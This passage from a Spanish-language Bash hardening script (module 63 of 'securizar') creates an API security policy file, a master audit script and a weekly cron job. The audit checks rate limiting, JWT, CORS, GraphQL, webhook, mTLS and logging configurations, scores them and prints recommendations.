log_info "Configura auditoria integral de todas las secciones:"
log_info "  - Script maestro de auditoria"
log_info "  - Puntuacion: EXCELENTE/BUENO/MEJORABLE/DEFICIENTE"
log_info "  - Reporte en /var/log/securizar/"
log_info "  - Cron semanal"
log_info "  - Politica global /etc/securizar/api-security-policy.conf"
echo ""

if check_file_exists /usr/local/bin/auditar-seguridad-api.sh; then
    log_already "Auditoria integral de seguridad API (auditar-seguridad-api.sh existe)"
elif ask "¿Configurar auditoria integral de seguridad API?"; then

    # ── Politica global ──────────────────────────────────────
    GLOBAL_POLICY="/etc/securizar/api-security-policy.conf"
    if [[ -f "$GLOBAL_POLICY" ]]; then
        cp -a "$GLOBAL_POLICY" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$GLOBAL_POLICY" << 'EOF'
# ============================================================
# api-security-policy.conf - Politica global de seguridad API
# Generado por securizar - Modulo 63
# ============================================================

# ── Secciones habilitadas ────────────────────────────────────
AUDIT_RATE_LIMITING=true
AUDIT_AUTHENTICATION=true
AUDIT_INPUT_VALIDATION=true
AUDIT_CORS_HEADERS=true
AUDIT_GATEWAY=true
AUDIT_GRAPHQL=true
AUDIT_WEBHOOKS=true
AUDIT_MTLS=true
AUDIT_LOGGING=true

# ── Puntuacion minima aceptable ──────────────────────────────
MIN_SCORE_EXCELLENT=90
MIN_SCORE_GOOD=70
MIN_SCORE_IMPROVABLE=50

# ── Notificaciones ───────────────────────────────────────────
NOTIFY_EMAIL=""
NOTIFY_ON_DEFICIENT=true
NOTIFY_ON_IMPROVABLE=false

# ── Reporting ────────────────────────────────────────────────
REPORT_DIR="/var/log/securizar"
REPORT_FORMAT="text"
REPORT_RETENTION_DAYS=365
EOF
    log_change "Creado" "$GLOBAL_POLICY"

    # ── Script maestro de auditoria ──────────────────────────
    AUDIT_SCRIPT="/usr/local/bin/auditar-seguridad-api.sh"
    if [[ -f "$AUDIT_SCRIPT" ]]; then
        cp -a "$AUDIT_SCRIPT" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$AUDIT_SCRIPT" << 'EOFAUDIT'
#!/bin/bash
# ============================================================
# auditar-seguridad-api.sh - Auditoria integral de seguridad API
# Generado por securizar - Modulo 63
# ============================================================
# Uso: auditar-seguridad-api.sh [--full|--quick|--section N]
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

POLICY="/etc/securizar/api-security-policy.conf"
REPORT_DIR="/var/log/securizar"
FECHA=$(date '+%Y%m%d-%H%M%S')
REPORT_FILE="${REPORT_DIR}/auditoria-api-${FECHA}.txt"
MODE="${1:---full}"

# Cargar politica
if [[ -f "$POLICY" ]]; then
    source "$POLICY" 2>/dev/null || true
fi

TOTAL_CHECKS=0
PASSED_CHECKS=0
FAILED_CHECKS=0
WARNING_CHECKS=0

mkdir -p "$REPORT_DIR"

# ── Funciones de reporte ─────────────────────────────────────
pass() {
    echo -e "  ${GREEN}[PASS]${NC} $1"
    echo "  [PASS] $1" >> "$REPORT_FILE"
    ((TOTAL_CHECKS++)) || true
    ((PASSED_CHECKS++)) || true
}

warn() {
    echo -e "  ${YELLOW}[WARN]${NC} $1"
    echo "  [WARN] $1" >> "$REPORT_FILE"
    ((TOTAL_CHECKS++)) || true
    ((WARNING_CHECKS++)) || true
}

fail() {
    echo -e "  ${RED}[FAIL]${NC} $1"
    echo "  [FAIL] $1" >> "$REPORT_FILE"
    ((TOTAL_CHECKS++)) || true
    ((FAILED_CHECKS++)) || true
}

section_header() {
    echo -e "\n${CYAN}══ $1 ══${NC}"
    echo "" >> "$REPORT_FILE"
    echo "== $1 ==" >> "$REPORT_FILE"
}

# ── Inicio del reporte ───────────────────────────────────────
echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "${BOLD}  AUDITORIA INTEGRAL DE SEGURIDAD API${NC}"
echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "  Fecha: $(date '+%Y-%m-%d %H:%M:%S')"
echo -e "  Modo:  $MODE"
echo ""

{
    echo "============================================================"
    echo "AUDITORIA INTEGRAL DE SEGURIDAD API"
    echo "Fecha: $(date '+%Y-%m-%d %H:%M:%S')"
    echo "Host: $(hostname)"
    echo "Modo: $MODE"
    echo "============================================================"
} > "$REPORT_FILE"

# ── S1: Rate Limiting ───────────────────────────────────────
section_header "S1: Rate Limiting y Throttling"

if [[ -f /etc/securizar/api-rate-limits.conf ]]; then
    pass "Configuracion de rate limits presente"
else
    fail "Falta /etc/securizar/api-rate-limits.conf"
fi

if command -v nginx &>/dev/null; then
    if [[ -f /etc/nginx/conf.d/securizar-api-ratelimit.conf ]]; then
        pass "Nginx rate limiting configurado"
        if nginx -t 2>/dev/null; then
            pass "Configuracion nginx valida"
        else
            fail "Configuracion nginx con errores"
        fi
    else
        fail "Falta configuracion de rate limiting en nginx"
    fi
fi

if command -v haproxy &>/dev/null; then
    if [[ -f /etc/securizar/api-gateway/haproxy-ratelimit.cfg ]]; then
        pass "HAProxy rate limiting template presente"
    else
        warn "Falta template de rate limiting HAProxy"
    fi
fi

if [[ -x /usr/local/bin/configurar-rate-limit.sh ]]; then
    pass "Script configurar-rate-limit.sh disponible"
else
    warn "Falta script configurar-rate-limit.sh"
fi

# ── S2: Authentication ───────────────────────────────────────
section_header "S2: API Authentication"

if [[ -f /etc/securizar/api-auth-policy.conf ]]; then
    pass "Politica de autenticacion presente"

    source /etc/securizar/api-auth-policy.conf 2>/dev/null || true
    if [[ "${JWT_FORBIDDEN_ALGORITHMS:-}" == *"none"* ]]; then
        pass "Algoritmo JWT 'none' prohibido"
    else
        fail "Algoritmo JWT 'none' no esta explicitamente prohibido"
    fi

    if [[ "${AUTH_REQUIRE_TLS:-false}" == "true" ]]; then
        pass "TLS requerido para autenticacion"
    else
        fail "TLS no requerido para autenticacion"
    fi

    if [[ "${API_KEY_NEVER_STORE_PLAINTEXT:-false}" == "true" ]]; then
        pass "API keys: almacenamiento plaintext prohibido"
    else
        warn "API keys: almacenamiento plaintext no prohibido"
    fi
else
    fail "Falta /etc/securizar/api-auth-policy.conf"
fi

if [[ -x /usr/local/bin/auditar-jwt.sh ]]; then
    pass "Script auditar-jwt.sh disponible"
else
    warn "Falta script auditar-jwt.sh"
fi

# ── S3: Input Validation ────────────────────────────────────
section_header "S3: Input Validation"

if [[ -f /etc/securizar/api-input-validation.conf ]]; then
    pass "Configuracion de validacion de input presente"
else
    fail "Falta /etc/securizar/api-input-validation.conf"
fi

if [[ -x /usr/local/bin/auditar-api-input.sh ]]; then
    pass "Script auditar-api-input.sh disponible"
else
    warn "Falta script auditar-api-input.sh"
fi

if [[ -f /etc/securizar/openapi-security-template.yaml ]]; then
    pass "Template OpenAPI de seguridad presente"
else
    warn "Falta template OpenAPI"
fi

# ── S4: CORS y Security Headers ─────────────────────────────
section_header "S4: CORS y Security Headers"

if command -v nginx &>/dev/null; then
    if [[ -f /etc/nginx/snippets/securizar-api-cors.conf ]]; then
        pass "Nginx CORS config presente"

        if grep -q "Access-Control-Allow-Origin.*\*" /etc/nginx/snippets/securizar-api-cors.conf 2>/dev/null; then
            fail "CORS Allow-Origin con wildcard '*' en nginx"
        else
            pass "CORS Allow-Origin restrictivo en nginx"
        fi
    else
        warn "Falta configuracion CORS en nginx"
    fi
fi

if [[ -x /usr/local/bin/auditar-headers-api.sh ]]; then
    pass "Script auditar-headers-api.sh disponible"
else
    warn "Falta script auditar-headers-api.sh"
fi

# ── S5: API Gateway ─────────────────────────────────────────
section_header "S5: API Gateway Hardening"

if [[ -d /etc/securizar/api-gateway ]]; then
    pass "Directorio de templates gateway presente"

    if [[ -f /etc/securizar/api-gateway/nginx-api-gateway.conf ]]; then
        pass "Template nginx gateway presente"
    else
        warn "Falta template nginx gateway"
    fi

    if [[ -f /etc/securizar/api-gateway/haproxy-api-gateway.cfg ]]; then
        pass "Template HAProxy gateway presente"
    else
        warn "Falta template HAProxy gateway"
    fi
else
    fail "Falta directorio /etc/securizar/api-gateway/"
fi

# ── S6: GraphQL ──────────────────────────────────────────────
section_header "S6: GraphQL Security"

if [[ -f /etc/securizar/graphql-policy.conf ]]; then
    pass "Politica GraphQL presente"

    source /etc/securizar/graphql-policy.conf 2>/dev/null || true
    if [[ "${GRAPHQL_DISABLE_INTROSPECTION:-false}" == "true" ]]; then
        pass "Introspection deshabilitada en politica"
    else
        warn "Introspection no deshabilitada en politica"
    fi

    max_depth="${GRAPHQL_MAX_DEPTH:-0}"
    if [[ "$max_depth" -gt 0 && "$max_depth" -le 15 ]]; then
        pass "Query depth limit configurado: $max_depth"
    elif [[ "$max_depth" -gt 15 ]]; then
        warn "Query depth limit alto: $max_depth (recomendado <= 15)"
    else
        fail "Query depth limit no configurado"
    fi
else
    warn "Falta /etc/securizar/graphql-policy.conf (ignorar si no usa GraphQL)"
fi

if [[ -x /usr/local/bin/auditar-graphql.sh ]]; then
    pass "Script auditar-graphql.sh disponible"
else
    warn "Falta script auditar-graphql.sh"
fi

# ── S7: Webhooks ─────────────────────────────────────────────
section_header "S7: Webhook Verification"

if [[ -x /usr/local/bin/verificar-webhooks.sh ]]; then
    pass "Script verificar-webhooks.sh disponible"
else
    warn "Falta script verificar-webhooks.sh"
fi

if [[ -d /etc/securizar/webhook-secrets ]]; then
    local_perms=$(stat -c "%a" /etc/securizar/webhook-secrets 2>/dev/null || echo "?")
    if [[ "$local_perms" == "700" ]]; then
        pass "Directorio webhook-secrets con permisos correctos (700)"
    else
        fail "Directorio webhook-secrets con permisos incorrectos ($local_perms, esperado 700)"
    fi
else
    warn "Falta directorio /etc/securizar/webhook-secrets/"
fi

if [[ -f /etc/securizar/webhook-ip-whitelist.conf ]]; then
    pass "Whitelist de IPs webhook presente"
else
    warn "Falta whitelist de IPs webhook"
fi

# ── S8: mTLS ────────────────────────────────────────────────
section_header "S8: mTLS para Microservicios"

if [[ -f /etc/securizar/mtls-policy.conf ]]; then
    pass "Politica mTLS presente"
else
    warn "Falta /etc/securizar/mtls-policy.conf"
fi

if [[ -x /usr/local/bin/gestionar-mtls.sh ]]; then
    pass "Script gestionar-mtls.sh disponible"
else
    warn "Falta script gestionar-mtls.sh"
fi

MTLS_CA_DIR="${MTLS_CA_DIR:-/etc/securizar/mtls-ca}"
if [[ -d "$MTLS_CA_DIR" && -f "$MTLS_CA_DIR/certs/ca.crt" ]]; then
    pass "CA mTLS inicializada"

    ca_key_perms=$(stat -c "%a" "$MTLS_CA_DIR/private/ca.key" 2>/dev/null || echo "?")
    if [[ "$ca_key_perms" == "400" ]]; then
        pass "CA private key con permisos correctos (400)"
    else
        fail "CA private key con permisos inseguros ($ca_key_perms, esperado 400)"
    fi

    # Verificar expiracion CA
    if command -v openssl &>/dev/null; then
        if openssl x509 -checkend 2592000 -noout -in "$MTLS_CA_DIR/certs/ca.crt" 2>/dev/null; then
            pass "Certificado CA no expira en 30 dias"
        else
            fail "Certificado CA expira pronto o ya expiro"
        fi
    fi
else
    warn "CA mTLS no inicializada (ejecutar: gestionar-mtls.sh init-ca)"
fi

if [[ -f /etc/securizar/api-gateway/nginx-mtls.conf ]]; then
    pass "Template nginx mTLS presente"
else
    warn "Falta template nginx mTLS"
fi

# ── S9: Logging ──────────────────────────────────────────────
section_header "S9: API Logging y Audit Trails"

if [[ -f /etc/securizar/api-logging.conf ]]; then
    pass "Configuracion de API logging presente"
else
    fail "Falta /etc/securizar/api-logging.conf"
fi

if [[ -d /var/log/securizar/api ]]; then
    pass "Directorio de logs API existe"

    dir_perms=$(stat -c "%a" /var/log/securizar/api 2>/dev/null || echo "?")
    if [[ "$dir_perms" == "750" || "$dir_perms" == "700" ]]; then
        pass "Permisos directorio logs correctos ($dir_perms)"
    else
        warn "Permisos directorio logs: $dir_perms (recomendado 750)"
    fi
else
    fail "Falta directorio /var/log/securizar/api/"
fi

if [[ -f /etc/logrotate.d/securizar-api ]]; then
    pass "Logrotate configurado para API logs"
else
    warn "Falta logrotate para API logs"
fi

if [[ -x /usr/local/bin/analizar-logs-api.sh ]]; then
    pass "Script analizar-logs-api.sh disponible"
else
    warn "Falta script analizar-logs-api.sh"
fi

if [[ -f /etc/rsyslog.d/60-securizar-api.conf ]]; then
    pass "Rsyslog configurado para API logs"
else
    warn "Falta configuracion rsyslog para API"
fi

# ── Calcular puntuacion ──────────────────────────────────────
echo ""
echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "${BOLD}  RESULTADO DE AUDITORIA${NC}"
echo -e "${BOLD}══════════════════════════════════════════${NC}"

SCORE=0
if [[ $TOTAL_CHECKS -gt 0 ]]; then
    SCORE=$(( (PASSED_CHECKS * 100) / TOTAL_CHECKS ))
fi

echo -e "  Checks totales:  $TOTAL_CHECKS"
echo -e "  ${GREEN}Pasados:${NC}       $PASSED_CHECKS"
echo -e "  ${YELLOW}Avisos:${NC}        $WARNING_CHECKS"
echo -e "  ${RED}Fallos:${NC}        $FAILED_CHECKS"
echo -e "  Puntuacion:      ${SCORE}%"
echo ""

RATING=""
if [[ $SCORE -ge ${MIN_SCORE_EXCELLENT:-90} ]]; then
    RATING="EXCELENTE"
    echo -e "  Calificacion: ${GREEN}${BOLD}${RATING}${NC}"
elif [[ $SCORE -ge ${MIN_SCORE_GOOD:-70} ]]; then
    RATING="BUENO"
    echo -e "  Calificacion: ${GREEN}${RATING}${NC}"
elif [[ $SCORE -ge ${MIN_SCORE_IMPROVABLE:-50} ]]; then
    RATING="MEJORABLE"
    echo -e "  Calificacion: ${YELLOW}${RATING}${NC}"
else
    RATING="DEFICIENTE"
    echo -e "  Calificacion: ${RED}${BOLD}${RATING}${NC}"
fi

# Escribir resumen en reporte
{
    echo ""
    echo "============================================================"
    echo "RESULTADO"
    echo "============================================================"
    echo "Checks totales: $TOTAL_CHECKS"
    echo "Pasados:        $PASSED_CHECKS"
    echo "Avisos:         $WARNING_CHECKS"
    echo "Fallos:         $FAILED_CHECKS"
    echo "Puntuacion:     ${SCORE}%"
    echo "Calificacion:   $RATING"
    echo "============================================================"
} >> "$REPORT_FILE"

echo ""
echo -e "  Reporte guardado: ${BOLD}$REPORT_FILE${NC}"
echo ""

# ── Recomendaciones ──────────────────────────────────────────
if [[ $FAILED_CHECKS -gt 0 ]]; then
    echo -e "${CYAN}── Recomendaciones ──${NC}"
    {
        echo ""
        echo "RECOMENDACIONES:"
    } >> "$REPORT_FILE"

    if ! [[ -f /etc/securizar/api-rate-limits.conf ]]; then
        echo -e "  1. Configurar rate limiting: ejecutar seguridad-api.sh seccion S1"
        echo "  1. Configurar rate limiting" >> "$REPORT_FILE"
    fi
    if ! [[ -f /etc/securizar/api-auth-policy.conf ]]; then
        echo -e "  2. Configurar politica de autenticacion: seccion S2"
        echo "  2. Configurar politica de autenticacion" >> "$REPORT_FILE"
    fi
    if ! [[ -f /etc/securizar/api-input-validation.conf ]]; then
        echo -e "  3. Configurar validacion de input: seccion S3"
        echo "  3. Configurar validacion de input" >> "$REPORT_FILE"
    fi
    if ! [[ -d /etc/securizar/api-gateway ]]; then
        echo -e "  4. Configurar API gateway: seccion S5"
        echo "  4. Configurar API gateway" >> "$REPORT_FILE"
    fi
    if ! [[ -f /etc/securizar/api-logging.conf ]]; then
        echo -e "  5. Configurar API logging: seccion S9"
        echo "  5. Configurar API logging" >> "$REPORT_FILE"
    fi
    echo ""
fi

[[ $FAILED_CHECKS -gt 0 ]] && exit 1 || exit 0
EOFAUDIT
    chmod +x "$AUDIT_SCRIPT"
    log_change "Creado" "$AUDIT_SCRIPT"
    log_change "Permisos" "$AUDIT_SCRIPT -> +x"

    # ── Cron semanal ─────────────────────────────────────────
    CRON_AUDIT="/etc/cron.weekly/auditar-api"
    if [[ -f "$CRON_AUDIT" ]]; then
        cp -a "$CRON_AUDIT" "$BACKUP_DIR/"
        log_change "Backup" "$CRON_AUDIT existente"
    fi

    cat > "$CRON_AUDIT" << 'EOF'
#!/bin/bash
# Auditoria semanal de seguridad API - securizar Modulo 63
/usr/local/bin/auditar-seguridad-api.sh --full >> /var/log/securizar/auditoria-api-cron.log 2>&1
EOF
    chmod +x "$CRON_AUDIT"
    log_change "Creado" "$CRON_AUDIT"

    log_info "Auditoria integral de seguridad API configurada"
    log_info "Ejecuta: auditar-seguridad-api.sh --full"
else
    log_skip "Auditoria integral de seguridad API"
fi

# ============================================================
# RESUMEN FINAL
# ============================================================
show_changes_summary
echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║     SEGURIDAD DE APIs (MODULO 63) COMPLETADO             ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
log_info "Backups guardados en: $BACKUP_DIR"
echo ""
echo "Comandos utiles post-configuracion:"
echo "  - Rate limits:          configurar-rate-limit.sh status"
echo "  - Auditar JWT:          auditar-jwt.sh --token TOKEN"
echo "  - Auditar input:        auditar-api-input.sh URL --all"
echo "  - Auditar headers:      auditar-headers-api.sh URL --all"
echo "  - Auditar GraphQL:      auditar-graphql.sh URL --all"
echo "  - Verificar webhooks:   verificar-webhooks.sh test"
echo "  - Gestionar mTLS:       gestionar-mtls.sh status"
echo "  - Analizar logs:        analizar-logs-api.sh --today"
echo "  - Auditoria completa:   auditar-seguridad-api.sh --full"
echo ""
log_warn "RECOMENDACION: Ejecuta 'auditar-seguridad-api.sh --full' para ver la postura actual"
log_info "Modulo 63 completado"
echo ""
